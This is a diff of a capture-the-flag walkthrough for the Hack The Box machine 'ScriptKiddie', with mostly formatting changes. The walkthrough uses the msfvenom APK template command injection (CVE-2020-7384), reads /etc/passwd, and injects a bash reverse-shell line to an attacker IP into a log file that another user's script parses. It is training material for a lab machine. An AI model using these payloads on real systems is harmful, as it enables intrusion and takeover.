@@ -1,39 +1,42 @@
 # ScriptKiddie
 
 ## Details
-* **Points**: 20
-* **Difficulty**: Easy  
-* **Operating System**: Linux
-* **IP Address**: 10.10.10.226
+
+- **Points**: 20
+- **Difficulty**: Easy
+- **Operating System**: Linux
+- **IP Address**: 10.10.10.226
 
 ## Table of Contents
-* Foothold & User
-  * [Network Scanning](#network-scanning)
-  * [Website Exploration](#website-exploration)
-  * [CVE-2020-7384: Msfvenom APK Template Command Injection](#cve-2020-7384-msfvenom-apk-template-command-injection)
-  * [Getting the User Flag](#getting-the-user-flag)
-* Root
-  * [Getting Fully Interactive Shell](#getting-fully-interactive-shell)
-  * [`pwn` user](#pwn-user)
-  * [`scanlosers.sh`](#scanloserssh)
-  * [`pwn` Reverse Shell](#pwn-reverse-shell)
-  * [Getting the Root Flag](#getting-the-root-flag)
+
+- Foothold & User
+  - [Network Scanning](#network-scanning)
+  - [Web Application Enumeration](#web-application-enumeration)
+  - [CVE-2020-7384: Msfvenom APK Template Command Injection](#cve-2020-7384-msfvenom-apk-template-command-injection)
+  - [Getting the User Flag](#getting-the-user-flag)
+- Root
+  - [Getting Fully Interactive Shell](#getting-fully-interactive-shell)
+  - [`pwn` user](#pwn-user)
+  - [`scanlosers.sh`](#scanloserssh)
+  - [`pwn` Reverse Shell](#pwn-reverse-shell)
+  - [Getting the Root Flag](#getting-the-root-flag)
 
 ## Walkthrough
 
 ### Network Scanning
+
 Firstly, we start off with network scanning with Nmap.
 
 ```
-$ sudo nmap -A -p$(nmap -T4 -p- 10.10.10.226 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.10.226                                                  
-[sudo] password for kali: 
+$ sudo nmap -A -p$(nmap -T4 -p- 10.10.10.226 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.10.226
+[sudo] password for kali:
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 15:27 AEST
 Nmap scan report for 10.10.10.226
 Host is up (0.022s latency).
 
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
 |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
 |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
@@ -57,7 +60,8 @@ Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
 
 Port 5000 of the remote machine is running a web server. Let's visit `http://10.10.10.226:5000/`.
 
-### Website Exploration
+### Web Application Enumeration
+
 ![website](images/0.png)
 
 It seems that the website features several hacking tools, which are nmap, msfvenom and searchsploit.
@@ -72,9 +76,11 @@ Now, let's move on to msfvenom. It allows template file to be uploaded. Since I 
 Apparently, a template file can be used to [evade detection by an anti virus software](https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates). While researching further, I stumbled upon [this](https://www.exploit-db.com/exploits/49491) entry in exploit-db. When generating a payload with msfvenom, using an APK template file can result in command injection.
 
 ### CVE-2020-7384: Msfvenom APK Template Command Injection
+
 ![searchsploit](images/2.png)
 
 We can also find the vulnerability entry in `msfconsole`.
+
 ```
 $ msfconsole -q
 msf6 > search msfvenom
@@ -91,6 +97,7 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 ```
 
 Let's use the exploit and configure the available options.
+
 ```
 msf6 > use 0
 msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options
@@ -122,21 +129,24 @@ python3 49491.py
 ```
 
 ### Getting the User Flag
+
 Next, upload the apk template file to the website. Change the `os` to `android` and `lhost` to your ip address.
 ![apk upload](images/3.png)
 
 Set up a listener with `nc -nlvp 4444` and click on `generate` on the website.
 
-Now, we should get a reverse shell on the remote machine as user `kid`. 
+Now, we should get a reverse shell on the remote machine as user `kid`.
 
 ![user flag](images/4.png)
 
 ### Getting Fully Interactive Shell
+
 NOTE: to do the following steps make sure to use bash instead of zsh, which is the default shell of the newer version of kali linux.
 
 Once we have got the user shell, we can try to [upgrade the shell to a fully interactive shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). This is done to prevent accidentally killing the reverse shell connection and spawning weird characters when clicking the arrow keys.
 
 Firstly, we spawn a pseudo-terminal with python then background the shell with `Control+Z`.
+
 ```
 kid@scriptkiddie:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 kid@scriptkiddie:~/html$ ^Z
@@ -144,6 +154,7 @@ kid@scriptkiddie:~/html$ ^Z
 ```
 
 Next, get info of our terminal. Take note of $TERM, rows and columns.
+
 ```
 $ echo $TERM
 xterm-256color
@@ -158,6 +169,7 @@ isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echo
 ```
 
 Finally, make the terminal pass through keyboard shortcuts and so on with `$ stty raw -echo` and then foreground the terminal with `fg`. Then, set up the SHELL and TERM environment variables along with the rows & columns of the terminal to match our own.
+
 ```
 $ stty raw -echo
 $ fg
@@ -165,20 +177,23 @@ kid@scriptkiddie:~/html$ export SHELL=bash
 kid@scriptkiddie:~/html$ export TERM=xterm-256color
 kid@scriptkiddie:~/html$ stty rows 47 columns 177
 ```
+
 ### `pwn` user
 
 Reading the `/etc/passwd` file tells us that there is another user in the machine, which is `pwn`.
+
 ```
 kid@scriptkiddie:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 
-# -- snip -- 
+# -- snip --
 
 kid:x:1000:1000:kid:/home/kid:/bin/bash
 pwn:x:1001:1001::/home/pwn:/bin/bash
 ```
 
 ### `scanlosers.sh`
+
 Looking at `pwn` home directory, we can find a script `scanlosers.sh`
 
 ```
@@ -202,6 +217,7 @@ if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 ```
 
 So, the script reads the file from `/home/kid/logs/hackers`, which we can write into.
+
 ```
 kid@scriptkiddie:/home/pwn$ ls -l /home/kid/logs/hackers
 -rw-rw-r-- 1 kid pwn 0 Feb  3 11:46 /home/kid/logs/hackers
@@ -210,7 +226,9 @@ kid@scriptkiddie:/home/pwn$ ls -l /home/kid/logs/hackers
 Then, it will ignore the first two words with `cut -d' ' -f3-`. The `-f3-` takes the third word and anything after it from each line (this differs from `-f3`, which only takes the third word from each line).
 
 ### `pwn` Reverse Shell
+
 What we can do is to write into `/home/kid/logs/hackers` the script that will generate a new reverse shell.
+
 ```
 echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/5555 0>&1'; " > /home/kid/logs/hackers
 ```
@@ -222,7 +240,9 @@ Don't forget to set a listener on port 5555 with `nc -nlvp 5555`.
 Next, upgrade our shell to a fully interactive shell again.
 
 ### Getting the Root Flag
+
 Once we got the reverse shell of `pwn` user, we can try to execute `sudo -l` to determine the user's permission.
+
 ```
 pwn@scriptkiddie:~$ sudo -l
 Matching Defaults entries for pwn on scriptkiddie:
